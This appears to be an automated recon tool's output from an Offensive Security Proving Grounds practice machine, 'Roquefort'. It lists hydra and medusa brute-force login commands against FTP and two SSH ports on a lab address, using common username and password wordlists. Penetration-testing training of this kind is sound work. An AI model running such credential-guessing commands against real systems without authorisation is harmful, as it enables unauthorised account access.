```bash
[*] ftp on tcp/21

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Roquefort/results/192.168.90.67/scans/tcp_21_ftp_hydra.txt" ftp://192.168.90.67

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 21 -O "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Roquefort/results/192.168.90.67/scans/tcp_21_ftp_medusa.txt" -M ftp -h 192.168.90.67

[*] ssh on tcp/22

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Roquefort/results/192.168.90.67/scans/tcp_22_ssh_hydra.txt" ssh://192.168.90.67

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Roquefort/results/192.168.90.67/scans/tcp_22_ssh_medusa.txt" -M ssh -h 192.168.90.67

[*] ssh on tcp/2222

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 2222 -o "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Roquefort/results/192.168.90.67/scans/tcp_2222_ssh_hydra.txt" ssh://192.168.90.67

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 2222 -O "/media/sf_Stuff1/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/Roquefort/results/192.168.90.67/scans/tcp_2222_ssh_medusa.txt" -M ssh -h 192.168.90.67


```